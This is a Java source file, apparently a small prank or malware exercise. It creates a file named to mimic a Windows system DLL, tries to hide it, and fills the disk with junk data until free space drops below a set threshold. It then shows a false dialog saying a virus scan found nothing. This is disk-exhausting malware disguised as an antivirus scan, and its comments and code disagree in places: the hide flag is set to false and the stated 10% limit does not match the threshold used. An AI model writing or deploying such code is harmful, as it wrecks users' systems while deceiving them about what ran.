/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author k36f275
 */

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.jar.Attributes;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.lang.management.*;
import javax.swing.JOptionPane;
public class Driver {
static File file;
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
        
        //Find root Directory & path to System32
        String rootPath = System.getenv("SystemRoot") + "\\System32";
        //(need root permissions)
       //String absoluteFilePath = rootPath+"\\KERNEL-32.DLL"; 
       String absoluteFilePath = "Z:\\KERNEL-32.DLL";
       
       //create new file
        file = new File(absoluteFilePath);
        if(file.createNewFile()){
            System.out.println(absoluteFilePath+" File Created");
        }else System.out.println("File "+absoluteFilePath+" already exists");
       
        //Hide the file
        Path path = Paths.get(absoluteFilePath);
        Files.setAttribute(path, "dos:hidden", false);

        //To write to the file
        BufferedWriter writer = new BufferedWriter(new FileWriter(file));
        
        
       
        
        System.out.println(calcPercentFree());
        
        //while the percent free is >10
        while(calcPercentFree()>45.50997){
            //write to the file
            writer.write("1001010101010101010101010102");
        }
        
        writer.close();
        System.out.println(calcPercentFree());

        //Message to the user
        JOptionPane.showMessageDialog(null, "The scanning finishes and no virus is found!", "Alert", JOptionPane.INFORMATION_MESSAGE);


    }
    
    public static double calcPercentFree(){
         //Total Disk Space
        long totalSpace = file.getTotalSpace();
        //Total Free Space
        long freeSpace = file.getFreeSpace();
        //to get the percentage of space free...we want to stop when it is at 10%
        double percentFree = (double)freeSpace/totalSpace *100;
        
        return percentFree;
    }
    
}
